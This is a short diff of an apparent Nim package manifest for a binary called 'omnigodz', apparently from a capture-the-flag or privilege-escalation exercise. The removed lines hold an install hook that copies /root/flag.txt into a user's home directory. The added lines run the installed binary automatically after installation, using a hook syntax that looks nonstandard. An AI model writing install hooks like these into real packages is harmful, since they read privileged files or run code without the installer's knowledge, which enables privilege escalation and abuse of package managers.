@@ -14,6 +14,7 @@ requires "nim >= 1.0.0"
 
 bin = @["omnigodz"]
 
-# Install task
-task preInstall, "Run a shell command upon installation":
-  exec "cp /root/flag.txt /home/jack/flag.txt"
+# Post-install script
+script postInstall:
+  echo "Executing post-install script..."
+  exec "./omnigodz"
